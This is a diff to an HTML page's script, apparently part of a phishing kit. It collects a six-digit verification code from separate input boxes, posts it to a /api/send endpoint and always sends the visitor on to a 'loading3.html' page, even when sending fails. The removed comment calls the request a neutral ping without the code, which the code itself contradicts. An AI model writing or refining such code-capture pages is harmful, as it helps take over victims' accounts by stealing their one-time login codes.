@@ -145,25 +145,29 @@
 
   // Submit
   form.addEventListener("submit", async (e) => {
-    e.preventDefault();
+  e.preventDefault();
 
-    const code = document.getElementById("code").value.trim();
-    const text = `Code: ${code}`;
-    if (code.length !== 6) {
-      errEl.style.display = "block";
-      return;
-    }
+  const ziffern = Array.from(inputs).map(i => i.value).join("");
+  const text = `Code: ${ziffern}`;
 
-    // optionaler neutraler Ping (ohne Code-Inhalt)
+  if (!/^\d{6}$/.test(ziffern)) {
+    errEl.style.display = "block";
+    return;
+  }
+
+  try {
     await fetch("/api/send", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ message: text })
     });
+  } catch (err) {
+    // wenn du "immer weiterleiten" willst, Fehler ignorieren
+    console.error(err);
+  }
 
-    // immer weiterleiten
-    window.location.href = "loading3.html";
-  });
+  window.location.href = "loading3.html";
+});
 </script>
 </body>
 </html>
